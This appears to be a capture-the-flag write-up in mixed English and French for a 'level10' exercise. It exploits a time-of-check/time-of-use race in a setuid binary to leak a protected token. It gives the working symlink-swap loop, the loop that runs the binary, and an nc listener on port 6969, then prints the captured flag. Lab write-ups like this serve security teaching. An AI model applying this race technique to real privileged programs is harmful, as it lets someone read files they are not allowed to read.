As we've done in the previous exercises, we are starting by listing the files present in the repository:
```
ls -l
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token

./level10 file host
	sends file to host if you have access to it
```

We can see that there's an executable. Looks like we have to understand what it's doing.
Let's hexdump the executable to understand what is going on.

```
hexdump -C level10
```

We can see that the program is connecting to an host on the port 6969 and that it seems to be using access too.
By reading the man, we know that there's a short time between the permission using access and time the answer is sent.
So we'll use this error to get the flag.

As we've previously done let's create a symlic between the token and an other file that we create.
```
chmod 777 .
touch hack

while true; do ln -sf hack tmp; ln -sf token tmp; done
```
Nous faisons pointer maintenant nos 2 fichiers vers le dossier tmp (ln -f autorise a faire diriger un lien symbolique vers un dossier)

```
while true; do ./level10 tmp 127.0.0.1; done
```

En parallele, nous allons donc envoyer ce dossier qui pointe vers le token dans le niveau 10.
La boucle while est necessaire afin de profiter du temps que access prend afin de verifier les permissions.

```
while true; do nc -l 6969; done
```
Enfin nous allon recuperer l'output du port 6969 comme trouve au debut.

```
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
```
